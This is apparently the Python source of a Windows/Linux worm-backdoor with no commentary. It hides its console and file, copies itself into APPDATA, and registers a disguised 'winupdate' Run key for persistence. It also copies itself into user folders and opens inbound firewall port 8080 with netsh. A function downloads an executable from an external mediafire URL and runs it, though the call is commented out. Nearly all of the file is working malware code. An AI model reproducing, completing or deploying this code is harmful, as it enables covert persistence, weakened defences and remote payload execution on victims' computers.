#!/usr/bin/env python

from shutil import copyfile
import os, getpass
import random, sys, pkg_resources
from urllib2 import urlopen
import subprocess
import shutil
from time import sleep
import win32con
import win32api
import win32console
import win32gui
import win32event
import winerror
from _winreg import *

strPath = os.path.realpath(sys.argv[0])  # get file path
TMP = os.environ["TEMP"]  # get temp path
APPDATA = os.environ["APPDATA"]

src1 = os.path.abspath(__file__)
src = os.path.abspath(__file__)
usr = getpass.getuser()
URL = 'http://download2269.mediafire.com/92omzolxl7gg/b9n0lw33obqkou2/hexServer.exe'

hextornet   = ['winHex']#, Hxtprocess', 'HXTNet', 'HxWinProcess', 'NetWinHex']
directories = ['Documents']#, 'Downloads', 'Music', 'Pictures', 'Videos']
hexDir = zip(directories, hextornet)
localization = []
dst = ""

mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    sys.exit(0)


def windows_client(system = sys.platform):
        if system.startswith('win'):
            return True
        else:
            return False


def linux_client(system = sys.platform):
    if system.startswith('linux'):
        return True
    else:
        return False


def console():
        window = win32console.GetConsoleWindow()
        win32gui.ShowWindow(window,0)
        return True

def hide():
    if src:
        win32api.SetFileAttributes(src,win32con.FILE_ATTRIBUTE_HIDDEN)

def addStartup():
        try:
                strAppPath = APPDATA + "\\" + os.path.basename(strPath)
                copyfile(strPath, strAppPath)
                objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
                SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
        except WindowsError:
                print"ERROR"
        else:
                print"SUCCESS"



def verification(source, worm, dst):
        code = dst + worm + '.py'
        if source != code or source == code:
                source = os.path.abspath(dst + worm)
                #downloadBackDoor(URL, dst)
        else:
                print'[SOURCE != CODE]'
                pass
        
def validate():
        for d, w in hexDir:
                linux = '/' + usr + '/' + d + '/'
                windows = "C:/Users" + "/" + usr + "/" + d + "/"
                if linux_client():
                        verification(src1, w, linux)
                elif windows_client():
                        verification(src1, w, windows)
                else:
                        pass

def copyHex(hexworm, src, dst):
        copyfile(src, dst)
        print'[PROPAGATE]', dst
        hextornet.remove(hexworm)


def propagate():
        print"[===============Worm location==========]"
        for d, w in hexDir:
                if linux_client():
                        dst = '/' + usr + '/' + d + '/' + str(w) + '.py'
                elif windows_client():
                        dst = "C:/Users" + "/" + usr + "/" + d + "/" + str(w) + '.py'
                localization.append(dst)
                copyHex(w, src, dst)
        print"[======================================]"


def downloadBackDoor(url, path):
        print'\t[START DOWNLOAD]',src
        filename = url.split('/')[-1].split('#')[0].split('?')[0]
        content = urlopen(url).read()
        outfile = open(filename, "wb")
        outfile.write(content)
        outfile.close()
        source= os.path.join(path)
        print'[MOVE] ',source,'[TO] ',path
        #shutil.move(source, path)
        print'\t[DOWNLOAD IN]',os.path.abspath(filename)
        print'\t[DOWNLOAD DONE]', filename
        print'\t[RUNNING]',os.path.abspath(filename)
        run(os.path.abspath(filename))


def runWorms():
        for worm in range(0, len(localization)):
                run(localization[worm])


def run(program):
        print'[RUN]',program
        try:
                process = subprocess.Popen(str(program), shell=True)
                #process.wait()
        except Exception as e:
                return '[NOT RUN!!]'+str(e)


def openPort():
        os.system('netsh advfirewall firewall add rule name="Open Port 8080" dir=in action=allow protocol=TCP localport=8080')

def main():
        if windows_client():
                addStartup()
                propagate()
                validate()
                openPort()
                hide()
                console()
        elif linux_client():
                propagate()
                validate()


if __name__ == "__main__":
        main()
